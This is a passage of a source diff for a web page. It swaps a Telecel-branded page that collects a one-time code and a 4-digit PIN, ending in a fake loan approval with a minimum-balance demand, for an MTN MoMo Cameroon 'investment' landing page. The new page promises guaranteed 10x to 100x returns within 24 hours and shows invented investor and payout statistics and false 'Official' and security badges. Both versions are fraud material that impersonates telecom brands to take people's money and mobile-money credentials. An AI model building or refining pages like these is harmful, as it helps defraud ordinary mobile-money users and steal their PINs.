@@ -1,567 +1,654 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel - Verification</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(#fff, #f8f9fc);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            color: #333;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: #fff;
-            border-radius: 16px;
-            padding: 28px 20px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            text-align: center;
-        }
-        
-        .logo-t {
-            color: #E30613;
-            font-size: 48px;
-            font-weight: 900;
-            border: 4px solid #E30613;
-            border-radius: 50%;
-            width: 72px;
-            height: 72px;
-            line-height: 64px;
-            margin: 0 auto;
-        }
-        
-        .logo-text {
-            color: #E30613;
-            font-size: 26px;
-            font-weight: 700;
-            margin: 8px 0 20px;
-        }
-        
-        h1 {
-            font-size: 22px;
-            font-weight: 700;
-            margin: 0 0 12px;
-        }
-        
-        .subtitle {
-            font-size: 14.5px;
-            color: #555;
-            line-height: 1.45;
-            margin-bottom: 20px;
-        }
-        
-        .code-group {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-        
-        .code-box {
-            width: 50px;
-            height: 50px;
-            border: 1.5px solid #E30613;
-            border-radius: 10px;
-            font-size: 26px;
-            text-align: center;
-            background: #fff;
-            color: #333;
-            font-weight: 600;
-            outline: none;
-            transition: all 0.2s;
-        }
-        
-        .code-box:focus {
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
-            border-color: #E30613;
-        }
-        
-        .error-msg {
-            color: #dc3545;
-            font-size: 13.5px;
-            margin: 8px 0 20px;
-            display: none;
-        }
-        
-        .btn-action,
-        .btn-back {
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: .2s;
-            margin: 10px 0 6px;
-        }
-        
-        .btn-action {
-            color: #fff;
-            background: #ccc;
-            border: none;
-            cursor: not-allowed;
-        }
-        
-        .btn-action.enabled {
-            background: #E30613;
-            box-shadow: 0 3px 10px rgba(227, 6, 19, 0.25);
-            cursor: pointer;
-        }
-        
-        .btn-action.enabled:hover {
-            background: #c70512;
-        }
-        
-        .btn-back {
-            color: #E30613;
-            background: transparent;
-            border: 1.5px solid #E30613;
-        }
-        
-        .btn-back:hover {
-            background: rgba(227, 6, 19, 0.05);
-        }
-        
-        #otp-section,
-        #pin-section {
-            transition: opacity 0.4s ease;
-        }
-        
-        #pin-section {
-            display: none;
-            opacity: 0;
-        }
-        
-        #spinner {
-            position: fixed;
-            inset: 0;
-            background: rgba(227, 6, 19, 0.15);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        
-        .spin {
-            width: 56px;
-            height: 56px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #E30613;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
+    <title>Cameroon MTN MoMo Investment | Invest Today... Earn Tomorrow!</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts: Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        mtnYellow: '#FFCC00',
+                        mtnYellowHover: '#e6b800',
+                        mtnLightYellow: '#fffbeb',
+                        mtnDark: '#111827',
+                        mtnCharcoal: '#1f2937',
+                        mtnAmber: '#d97706',
+                        darkNavy: '#0f172a',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
             }
         }
-        /* SUCCESS SCREEN */
-        
-        #success {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.65);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            padding: 15px;
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
         }
-        
-        #success .card {
-            background: #fff;
-            border-radius: 16px;
-            padding: 28px 20px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.28);
-            text-align: center;
+
+        .hero-bg {
+            background: radial-gradient(120% 120% at 50% 10%, #262100 0%, #111827 60%, #090d16 100%);
         }
-        
-        #success .icon {
-            font-size: 64px;
-            color: #28a745;
-            margin-bottom: 16px;
+
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 204, 0, 0.16);
         }
-        
-        #success .btn-dashboard {
-            background: #28a745;
-            color: #fff;
-            border: none;
-            padding: 14px 24px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 10px;
+
+        .mtn-badge {
+            background: linear-gradient(135deg, #FFE680 0%, #FFCC00 100%);
+        }
+
+        /* Custom range slider styles */
+        input[type=range] {
+            -webkit-appearance: none;
+            background: transparent;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 26px;
+            width: 26px;
+            border-radius: 50%;
+            background: #FFCC00;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+            border: 3px solid #111827;
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.35);
+            margin-top: -9px;
         }
-        
-        #success .btn-dashboard:hover {
-            background: #218838;
-        }
-        
-        .highlight {
-            background: #f8fff9;
-            border: 1px solid #d4edda;
-            border-radius: 8px;
-            padding: 16px;
-            margin: 20px 0;
-        }
-        
-        .note {
-            font-size: 14px;
-            color: #666;
-            margin-top: 8px;
+
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 8px;
+            cursor: pointer;
+            background: #374151;
+            border-radius: 4px;
         }
     </style>
 </head>
 
-<body>
-    <div class="container">
-        <div class="logo-t">t</div>
-        <div class="logo-text">telecel</div>
-        <!-- OTP Stage -->
-        <div id="otp-section">
-            <h1>Verification Code</h1>
-            <p class="subtitle">Code sent to <span id="maskedPhone">loading...</span></p>
-            <div class="code-group" id="otp-group">
-                <!-- We'll create 6 boxes dynamically in JS when needed -->
+<body class="bg-gray-50 text-gray-900 antialiased selection:bg-mtnYellow selection:text-gray-900 flex flex-col min-h-screen">
+
+    <!-- TOP ANNOUNCEMENT TICKER -->
+    <div class="bg-mtnDark text-white text-xs py-2 px-4 border-b border-yellow-500/20">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-center gap-2">
+            <div class="flex items-center space-x-2 font-medium">
+                <span class="bg-mtnYellow text-gray-950 px-2 py-0.5 rounded text-[10px] font-extrabold uppercase tracking-wider">Official</span>
+                <span class="truncate">Cameroon MTN MoMo Investment Platform — Automated Mobile Wallet Payouts (XAF)</span>
             </div>
-            <div class="error-msg" id="otpError">Incorrect OTP</div>
-            <button class="btn-action" id="otpBtn" disabled>Continue</button>
-            <button class="btn-back" onclick="window.location.href='login'">Go Back</button>
-        </div>
-        <!-- PIN Stage (unchanged) -->
-        <div id="pin-section">
-            <h1>Enter PIN</h1>
-            <p class="subtitle">Enter your 4-digit PIN to complete verification</p>
-            <div class="code-group" id="pin-group">
-                <input type="tel" inputmode="numeric" class="code-box" maxlength="1" pattern="[0-9]*">
-                <input type="tel" inputmode="numeric" class="code-box" maxlength="1" pattern="[0-9]*">
-                <input type="tel" inputmode="numeric" class="code-box" maxlength="1" pattern="[0-9]*">
-                <input type="tel" inputmode="numeric" class="code-box" maxlength="1" pattern="[0-9]*">
+            <div class="flex items-center space-x-4 text-gray-200">
+                <span class="hidden md:inline"><i class="fa-solid fa-lock text-green-400 mr-1"></i> SSL 256-Bit Security</span>
+                <span><i class="fa-solid fa-headset text-mtnYellow mr-1"></i> 24/7 Support</span>
             </div>
-            <div class="error-msg" id="pinError">Incorrect PIN</div>
-            <button class="btn-action" id="pinBtn" disabled>Submit</button>
-            <button class="btn-back" onclick="window.location.href='login'">Go Back</button>
         </div>
     </div>
-    <div id="spinner">
-        <div class="spin"></div>
-    </div>
-    <div id="success">
-        <div class="card">
-            <div class="icon">✓</div>
-            <h1>Approved</h1>
-            <p>Congratulations! Your loan application for <span id="approvedAmount">loading...</span> has been approved.</p>
-            <p>Funds will be disbursed to your account <strong>within 3 hours</strong>.</p>
-            <div class="highlight">
-                <p><strong>Required:</strong> Please ensure your account maintains a balance of at least 20% (<span id="minBalance">loading...</span>) or more of the approved amount.</p>
-                <p class="note">This is a minimum balance requirement — not a fee or deduction.</p>
+
+    <!-- MAIN HEADER & NAVIGATION -->
+    <header class="bg-white sticky top-0 z-40 shadow-sm border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-20">
+
+                <!-- Brand Logo -->
+                <a href="#home" class="flex items-center space-x-3">
+                    <div class="flex flex-col">
+                        <div class="flex items-center leading-none space-x-1.5">
+                            <span class="text-2xl font-black bg-mtnYellow text-gray-950 px-2 py-0.5 rounded-md tracking-tight">MTN</span>
+                            <span class="text-3xl font-black text-gray-950 tracking-tight">MoMo</span>
+                        </div>
+                        <span class="text-[10px] font-bold text-gray-600 tracking-wider uppercase mt-1">Investment Cameroon</span>
+                    </div>
+                </a>
+
+                <!-- Desktop Navigation Links -->
+                <nav class="hidden md:flex items-center space-x-8 font-semibold text-sm text-gray-700">
+                    <a href="#home" class="hover:text-mtnAmber transition">Home</a>
+                    <a href="#about" class="hover:text-mtnAmber transition">About Us</a>
+                    <a href="#calculator" class="hover:text-mtnAmber transition">Investment Plans</a>
+                    <a href="#simulator" class="hover:text-mtnAmber transition">Deposit</a>
+                    <a href="#simulator" class="hover:text-mtnAmber transition">Withdraw</a>
+                    <a href="#contact" class="hover:text-mtnAmber transition">Contact Us</a>
+                </nav>
+
+                <!-- Mobile Menu Hamburger Button -->
+                <button type="button" onclick="toggleMobileMenu()" class="md:hidden text-gray-700 hover:text-mtnAmber p-2 focus:outline-none">
+                    <i id="menuIcon" class="fa-solid fa-bars text-2xl"></i>
+                </button>
             </div>
-            <button class="btn-dashboard" onclick="window.location.href='https://playtelecel.onrender.com'">
-            Go to Dashboard
-        </button>
         </div>
-    </div>
+
+        <!-- Mobile Navigation Drawer -->
+        <div id="mobileDrawer" class="hidden md:hidden bg-white border-b border-gray-200 px-4 pt-2 pb-6 space-y-3">
+            <a href="#home" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber border-b border-gray-100">Home</a>
+            <a href="#about" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber border-b border-gray-100">About Us</a>
+            <a href="#calculator" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber border-b border-gray-100">Investment Plans</a>
+            <a href="#simulator" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber border-b border-gray-100">Deposit</a>
+            <a href="#simulator" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber border-b border-gray-100">Withdraw</a>
+            <a href="#contact" onclick="toggleMobileMenu()" class="block py-2 text-base font-medium text-gray-800 hover:text-mtnAmber">Contact Us</a>
+        </div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section id="home" class="hero-bg text-white relative overflow-hidden py-16 lg:py-24">
+        <div class="absolute top-0 right-0 w-96 h-96 bg-mtnYellow opacity-15 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-0 left-0 w-96 h-96 bg-amber-500 opacity-15 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+
+                <!-- Hero Text & Value Proposition -->
+                <div class="lg:col-span-7 text-center lg:text-left space-y-6">
+                    <div class="inline-flex items-center space-x-2 bg-yellow-400/15 border border-mtnYellow/30 px-3.5 py-1.5 rounded-full text-xs font-semibold text-mtnYellow">
+                        <span class="w-2 h-2 rounded-full bg-green-400 animate-pulse"></span>
+                        <span>Verified Cameroon MTN MoMo Investment</span>
+                    </div>
+
+                    <h1 class="text-3xl sm:text-5xl lg:text-6xl font-black tracking-tight leading-tight">
+                        Grow Your Money with <span class="text-transparent bg-clip-text bg-gradient-to-r from-mtnYellow to-yellow-200">Cameroon MTN MoMo</span> Investment!
+                    </h1>
+
+                    <p class="text-xl sm:text-2xl font-bold italic text-mtnYellow tracking-wide">
+                        "Invest Today... Earn Tomorrow!"
+                    </p>
+
+                    <p class="text-gray-300 text-base sm:text-lg max-w-2xl font-normal leading-relaxed">
+                        Multiply your capital safely through our automated high-yield MTN MoMo profit system. Direct mobile wallet payouts processed to your Cameroon line 24/7.
+                    </p>
+
+                    <!-- Feature Badges -->
+                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2 text-left">
+                        <div class="glass-panel p-3 rounded-xl flex items-center space-x-2">
+                            <i class="fa-solid fa-shield-check text-green-400 text-lg"></i>
+                            <span class="text-xs font-semibold text-gray-200">Safe & Secure</span>
+                        </div>
+                        <div class="glass-panel p-3 rounded-xl flex items-center space-x-2">
+                            <i class="fa-solid fa-arrow-trend-up text-mtnYellow text-lg"></i>
+                            <span class="text-xs font-semibold text-gray-200">High Returns</span>
+                        </div>
+                        <div class="glass-panel p-3 rounded-xl flex items-center space-x-2">
+                            <i class="fa-solid fa-bolt text-mtnYellow text-lg"></i>
+                            <span class="text-xs font-semibold text-gray-200">Instant Deposits</span>
+                        </div>
+                        <div class="glass-panel p-3 rounded-xl flex items-center space-x-2">
+                            <i class="fa-solid fa-headset text-yellow-300 text-lg"></i>
+                            <span class="text-xs font-semibold text-gray-200">24/7 Support</span>
+                        </div>
+                    </div>
+
+                    <!-- Call To Action Buttons -->
+                    <div class="flex flex-col sm:flex-row items-center justify-center lg:justify-start gap-4 pt-4">
+                        <button type="button" onclick="redirectToLogin()" class="w-full sm:w-auto bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold text-lg px-8 py-4 rounded-xl shadow-xl hover:shadow-2xl transition transform active:scale-95 flex items-center justify-center space-x-3">
+                            <span>Start Investing Now</span>
+                            <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                        <button type="button" onclick="redirectToLogin('calculator')" class="w-full sm:w-auto bg-white/10 hover:bg-white/20 text-white font-bold text-lg px-6 py-4 rounded-xl border border-white/20 backdrop-blur transition text-center">
+                            Calculate Profit
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Hero Graphic Card -->
+                <div class="lg:col-span-5 flex justify-center">
+                    <div class="relative w-full max-w-md">
+                        <div class="absolute -inset-1 bg-gradient-to-r from-mtnYellow to-amber-500 rounded-3xl blur-xl opacity-35"></div>
+
+                        <div class="relative bg-darkNavy border border-yellow-400/30 rounded-3xl p-6 shadow-2xl text-white">
+                            <div class="flex justify-between items-center pb-4 border-b border-gray-800">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-lg font-black text-mtnYellow">MTN MoMo</span>
+                                    <span class="text-xs font-semibold bg-green-500/20 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full">Active Gateway</span>
+                                </div>
+                                <span class="text-xs text-gray-400 font-mono">CM • XAF</span>
+                            </div>
+
+                            <div class="my-6 text-center py-6 bg-gray-900 rounded-2xl border border-yellow-400/25">
+                                <div class="w-16 h-16 bg-green-500/20 text-green-400 rounded-full flex items-center justify-center mx-auto mb-3 border border-green-500/40">
+                                    <i class="fa-solid fa-check text-3xl"></i>
+                                </div>
+                                <p class="text-xs font-bold uppercase text-gray-400 tracking-wider">Automated Settlement</p>
+                                <h3 class="text-3xl font-black text-mtnYellow mt-1">500,000 XAF</h3>
+                                <p class="text-xs text-green-400 font-medium mt-2">Dispatched to MTN MoMo Wallet</p>
+                            </div>
+
+                            <div class="space-y-2.5 text-xs">
+                                <div class="flex justify-between text-gray-300">
+                                    <span>Sample Capital:</span>
+                                    <span class="font-bold text-white">50,000 XAF</span>
+                                </div>
+                                <div class="flex justify-between text-gray-300">
+                                    <span>Guaranteed Profit:</span>
+                                    <span class="font-bold text-mtnYellow">10x (500,000 XAF Total Return)</span>
+                                </div>
+                                <div class="flex justify-between text-gray-300">
+                                    <span>MoMo Payout:</span>
+                                    <span class="font-bold text-green-400">Instant Wallet Credit</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- LIVE METRICS COUNTER BAR -->
+    <section class="bg-white py-8 border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-6 text-center">
+                <div class="p-4 rounded-xl bg-gray-50 border border-gray-100 shadow-sm">
+                    <p class="text-xs font-bold uppercase tracking-wider text-gray-500">Active Cameroonian Investors</p>
+                    <h3 class="text-3xl font-black text-gray-950 mt-1">52,410+</h3>
+                    <p class="text-xs text-green-600 font-semibold mt-1"><i class="fa-solid fa-arrow-trend-up"></i> Growing daily</p>
+                </div>
+                <div class="p-4 rounded-xl bg-gray-50 border border-gray-100 shadow-sm">
+                    <p class="text-xs font-bold uppercase tracking-wider text-gray-500">Total Capital Processed</p>
+                    <h3 class="text-3xl font-black text-gray-950 mt-1">3.8B+ XAF</h3>
+                    <p class="text-xs text-gray-500 font-medium mt-1">Verified CFA Franc Vault</p>
+                </div>
+                <div class="p-4 rounded-xl bg-gray-50 border border-gray-100 shadow-sm">
+                    <p class="text-xs font-bold uppercase tracking-wider text-gray-500">Total Profits Paid Out</p>
+                    <h3 class="text-3xl font-black text-green-600 mt-1">19.2B+ XAF</h3>
+                    <p class="text-xs text-green-600 font-semibold mt-1"><i class="fa-solid fa-circle-check"></i> 100% Guaranteed Rate</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ABOUT SECTION -->
+    <section id="about" class="py-16 bg-white border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                <div class="space-y-6">
+                    <span class="text-mtnAmber text-xs font-extrabold uppercase tracking-widest bg-mtnLightYellow px-3 py-1 rounded-full border border-yellow-300">About Us</span>
+                    <h2 class="text-3xl sm:text-4xl font-black text-gray-900 leading-tight">
+                        Empowering Financial Freedom Across Cameroon
+                    </h2>
+                    <p class="text-gray-600 text-sm sm:text-base leading-relaxed">
+                        Cameroon MTN MoMo Investment provides a high-yield, transparent investment framework in CFA Francs (XAF) designed to help individuals grow their money safely. By integrating with MTN Mobile Money across Douala, Yaoundé, Bamenda, Bafoussam, Buea, and beyond, funding and payouts stay fast and straightforward.
+                    </p>
+                    <ul class="space-y-3 text-sm text-gray-700 font-medium">
+                        <li class="flex items-center"><i class="fa-solid fa-circle-check text-green-500 text-lg mr-3"></i> Automated profit settlement to MTN MoMo wallets.</li>
+                        <li class="flex items-center"><i class="fa-solid fa-circle-check text-green-500 text-lg mr-3"></i> Zero hidden platform fees or withdrawal hold-ups.</li>
+                        <li class="flex items-center"><i class="fa-solid fa-circle-check text-green-500 text-lg mr-3"></i> Dedicated 24/7 Cameroon client care team.</li>
+                    </ul>
+                </div>
+                <div class="bg-mtnLightYellow p-8 rounded-3xl border border-yellow-300 text-center space-y-6 shadow-sm">
+                    <div class="w-16 h-16 bg-mtnYellow text-gray-950 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
+                        <i class="fa-solid fa-wallet"></i>
+                    </div>
+                    <h3 class="text-2xl font-black text-gray-950">Ready to Multiply Your Funds?</h3>
+                    <p class="text-gray-600 text-xs sm:text-sm">Select an XAF investment tier today and experience payout delivery to your MTN MoMo line.</p>
+                    <button type="button" onclick="redirectToLogin()" class="w-full bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold py-4 rounded-xl shadow-lg transition transform active:scale-95">
+                        Start Investing Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- INVESTMENT TIERS & INTERACTIVE CALCULATOR -->
+    <section id="calculator" class="py-16 bg-gray-100">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <span class="text-mtnAmber text-xs font-extrabold uppercase tracking-widest bg-yellow-100 px-3 py-1 rounded-full">High Return Tiers</span>
+                <h2 class="text-3xl sm:text-4xl font-black text-gray-900 mt-3">Choose Your Investment Plan (XAF)</h2>
+                <p class="text-gray-600 text-sm sm:text-base mt-2">Projected returns calculated in Central African CFA Francs (XAF) for your MTN MoMo wallet.</p>
+            </div>
+
+            <!-- Tier Cards Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
+
+                <!-- Plan 1 -->
+                <div class="bg-white rounded-2xl p-6 border-2 border-gray-200 shadow-sm hover:border-mtnYellow transition flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="bg-yellow-100 text-gray-900 text-xs font-bold px-3 py-1 rounded-full uppercase">Starter Plan</span>
+                            <span class="text-xs font-bold text-gray-500">10x Yield</span>
+                        </div>
+                        <p class="text-xs text-gray-500 uppercase font-semibold">Invest Capital</p>
+                        <h3 class="text-3xl sm:text-4xl font-black text-gray-900 my-1">50,000 XAF</h3>
+                        <div class="my-6 p-4 bg-mtnLightYellow rounded-xl border border-yellow-200 text-center">
+                            <p class="text-xs font-bold text-gray-800 uppercase">Projected Return</p>
+                            <h4 class="text-2xl sm:text-3xl font-black text-gray-950 mt-1">500,000 XAF</h4>
+                        </div>
+                        <ul class="space-y-2.5 text-xs text-gray-600 mb-6">
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> Direct MTN MoMo Cameroon Credit</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> Fast 24-Hour Return Cycle</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> Zero Platform Transaction Fee</li>
+                        </ul>
+                    </div>
+                    <button type="button" onclick="redirectToLogin('plan', 50000)" class="w-full bg-mtnDark hover:bg-gray-800 text-mtnYellow font-extrabold py-3.5 rounded-xl transition shadow">
+                        Invest 50,000 XAF Now
+                    </button>
+                </div>
+
+                <!-- Plan 2 (Highlighted Popular Plan) -->
+                <div class="bg-darkNavy text-white rounded-2xl p-6 border-2 border-mtnYellow shadow-xl relative flex flex-col justify-between transform md:-translate-y-2">
+                    <div class="absolute -top-3.5 left-1/2 -translate-x-1/2 mtn-badge text-gray-950 text-[11px] font-black uppercase px-4 py-1 rounded-full shadow">
+                        Most Popular Choice
+                    </div>
+                    <div>
+                        <div class="flex justify-between items-center mb-4 mt-2">
+                            <span class="bg-yellow-400/20 text-mtnYellow text-xs font-bold px-3 py-1 rounded-full uppercase border border-yellow-400/30">Growth Plan</span>
+                            <span class="text-xs font-bold text-mtnYellow">10x Yield</span>
+                        </div>
+                        <p class="text-xs text-gray-400 uppercase font-semibold">Invest Capital</p>
+                        <h3 class="text-3xl sm:text-4xl font-black text-white my-1">250,000 XAF</h3>
+                        <div class="my-6 p-4 bg-gray-900 rounded-xl border border-yellow-400/30 text-center">
+                            <p class="text-xs font-bold text-mtnYellow uppercase">Projected Return</p>
+                            <h4 class="text-2xl sm:text-3xl font-black text-mtnYellow mt-1">2,500,000 XAF</h4>
+                        </div>
+                        <ul class="space-y-2.5 text-xs text-gray-300 mb-6">
+                            <li class="flex items-center"><i class="fa-solid fa-check text-mtnYellow mr-2"></i> Priority Automated Settlement</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-mtnYellow mr-2"></i> Dedicated Account Advisor</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-mtnYellow mr-2"></i> Zero Processing Fee</li>
+                        </ul>
+                    </div>
+                    <button type="button" onclick="redirectToLogin('plan', 250000)" class="w-full bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold py-3.5 rounded-xl transition shadow-lg">
+                        Invest 250,000 XAF Now
+                    </button>
+                </div>
+
+                <!-- Plan 3 (VIP Plan) -->
+                <div class="bg-white rounded-2xl p-6 border-2 border-gray-200 shadow-sm hover:border-mtnAmber transition flex flex-col justify-between">
+                    <div>
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="bg-amber-100 text-amber-900 text-xs font-bold px-3 py-1 rounded-full uppercase">VIP Platinum Tier</span>
+                            <span class="text-xs font-bold text-amber-700">100x Multiplier</span>
+                        </div>
+                        <p class="text-xs text-gray-500 uppercase font-semibold">Invest Capital</p>
+                        <h3 class="text-3xl sm:text-4xl font-black text-gray-900 my-1">1,000,000 XAF</h3>
+                        <div class="my-6 p-4 bg-amber-50 rounded-xl border border-amber-200 text-center">
+                            <p class="text-xs font-bold text-amber-900 uppercase">Maximum Profit Return</p>
+                            <h4 class="text-2xl sm:text-3xl font-black text-amber-800 mt-1">100,000,000 XAF</h4>
+                        </div>
+                        <ul class="space-y-2.5 text-xs text-gray-600 mb-6">
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> Maximum Capital Allocation</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> Instant VIP MoMo Transfer</li>
+                            <li class="flex items-center"><i class="fa-solid fa-check text-green-500 mr-2"></i> VIP Concierge Support</li>
+                        </ul>
+                    </div>
+                    <button type="button" onclick="redirectToLogin('plan', 1000000)" class="w-full bg-mtnDark hover:bg-gray-800 text-mtnYellow font-extrabold py-3.5 rounded-xl transition shadow">
+                        Invest 1,000,000 XAF Now
+                    </button>
+                </div>
+
+            </div>
+
+            <!-- Custom Interactive Profit Calculator Box -->
+            <div class="bg-white rounded-3xl p-6 sm:p-10 shadow-lg border border-gray-200">
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+
+                    <div class="lg:col-span-7 space-y-6">
+                        <h3 class="text-2xl font-bold text-gray-900">Custom Return Calculator (XAF)</h3>
+
+                        <div>
+                            <div class="flex justify-between items-center mb-2">
+                                <label class="text-sm font-bold text-gray-700">Set Your Investment (XAF):</label>
+                                <span id="sliderDisplay" class="text-2xl font-black text-gray-950">100,000 XAF</span>
+                            </div>
+                            <input type="range" id="profitSlider" min="10000" max="5000000" step="10000" value="100000" oninput="updateCalculator()" class="w-full">
+                            <div class="flex justify-between text-xs text-gray-400 font-medium mt-1">
+                                <span>Min: 10,000 XAF</span>
+                                <span>1,000,000 XAF</span>
+                                <span>2,500,000 XAF</span>
+                                <span>Max: 5,000,000 XAF</span>
+                            </div>
+                        </div>
+
+                        <!-- Manual Input Sync -->
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-500 mb-1">Or Enter Exact Amount (XAF):</label>
+                            <div class="relative max-w-xs">
+                                <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500 font-bold text-xs">XAF</span>
+                                <input type="number" id="manualAmountInput" value="100000" min="5000" max="50000000" oninput="syncManualCalculator()" class="w-full pl-12 pr-4 py-2 border border-gray-300 rounded-lg text-sm font-bold focus:outline-none focus:border-mtnYellow">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="lg:col-span-5 bg-mtnLightYellow p-6 rounded-2xl border border-yellow-300 text-center space-y-4">
+                        <p class="text-xs font-bold text-gray-600 uppercase">Estimated Return Output</p>
+                        <h3 id="calculatorResult" class="text-3xl sm:text-4xl font-black text-gray-950">1,000,000 XAF</h3>
+                        <p class="text-xs text-gray-500">Calculated based on standard 10x projected yield rates in XAF.</p>
+                        <button type="button" onclick="redirectToLogin('calculator')" class="w-full bg-mtnYellow hover:bg-mtnYellowHover text-gray-950 font-extrabold py-4 rounded-xl shadow-lg transition transform active:scale-95">
+                            Invest This Amount Now
+                        </button>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- INTERACTIVE DEPOSIT & WITHDRAWAL TERMINAL -->
+    <section id="simulator" class="py-16 bg-gray-900 text-white border-t border-gray-800">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-10">
+                <span class="text-mtnYellow text-xs font-extrabold uppercase tracking-widest">MTN MoMo Portal</span>
+                <h2 class="text-3xl font-black text-white mt-2">Mobile Wallet Transaction Terminal</h2>
+                <p class="text-gray-400 text-sm mt-1">Initiate XAF investment funding or direct MTN MoMo payout requests.</p>
+            </div>
+
+            <!-- Tab Buttons -->
+            <div class="bg-gray-800 p-1.5 rounded-xl flex max-w-xs mx-auto mb-8 border border-gray-700">
+                <button type="button" id="tabDep" onclick="switchTerminalTab('deposit')" class="w-1/2 py-2 text-xs font-bold rounded-lg transition bg-mtnYellow text-gray-950 shadow">Deposit</button>
+                <button type="button" id="tabWith" onclick="switchTerminalTab('withdraw')" class="w-1/2 py-2 text-xs font-bold rounded-lg transition text-gray-400 hover:text-white">Withdraw</button>
+            </div>
+
+            <!-- Terminal Form -->
